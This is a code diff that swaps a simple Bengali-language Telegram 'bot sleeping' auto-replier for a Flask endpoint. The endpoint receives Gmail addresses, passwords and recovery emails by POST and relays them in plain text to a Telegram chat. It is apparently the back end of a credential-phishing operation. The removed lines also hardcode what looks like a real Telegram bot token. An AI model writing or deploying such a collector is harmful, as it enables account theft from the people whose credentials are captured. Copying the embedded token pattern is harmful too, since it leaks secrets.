@@ -1,27 +1,26 @@
-from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
-from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
 
-TOKEN = '8149532850:AAG4fPQ_L0Imbv2NkA5lQI4SyP-52mpvyLY'
+from flask import Flask, request
+import telegram
+import os
 
-# ✅ Sleep Message
-SLEEP_MESSAGE = (
-    "⏳ দুঃখিত, বর্তমানে কাজটি বন্ধ রয়েছে।\n\n"
-    "🕕 সন্ধ্যা ৬টা থেকে রাত ১০টা পর্যন্ত এই বটটি চালু থাকে।\n\n"
-    "ধন্যবাদ 😊"
-)
+app = Flask(__name__)
 
-# 📩 Reply to any text message with the sleep message
-async def handle_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[KeyboardButton("💤 বট এখন ঘুমাচ্ছে")]]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-    await update.message.reply_text(SLEEP_MESSAGE, reply_markup=reply_markup)
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
-# ▶️ Main function
-def main():
-    app = ApplicationBuilder().token(TOKEN).build()
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_messages))
-    print("🤖 Bot is running in sleep mode...")
-    app.run_polling()
+bot = telegram.Bot(token=BOT_TOKEN)
+
+@app.route('/send_gmail_info', methods=['POST'])
+def send_gmail_info():
+    data = request.json
+    gmail = data.get("gmail")
+    password = data.get("password")
+    recovery = data.get("recovery")
+
+    # Placeholder logic - this would trigger automation in real deployment
+    bot.send_message(chat_id=CHAT_ID, text=f"📨 Gmail Info Received:\n📧 {gmail}\n🔐 {password}\n🔁 {recovery}")
+
+    return {"status": "received"}
 
 if __name__ == '__main__':
-    main()
+    app.run(host='0.0.0.0', port=10000)
